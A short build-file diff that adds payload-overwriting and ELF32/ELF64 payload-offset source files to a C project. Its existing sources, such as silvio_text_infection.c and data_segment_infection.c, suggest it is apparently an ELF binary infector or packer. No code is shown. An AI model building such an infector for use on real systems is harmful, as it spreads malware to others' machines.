@@ -100,6 +100,9 @@ SRC_NAME			:=	main.c								\
 						utils_elf.c							\
 						infection.c							\
 						utils_payload.c						\
+						overwrite_payload.c					\
+						find_payload_offset_elf32.c			\
+						find_payload_offset_elf64.c			\
 						silvio_text_infection.c				\
 						data_segment_infection.c			\
 						crypto.c							\
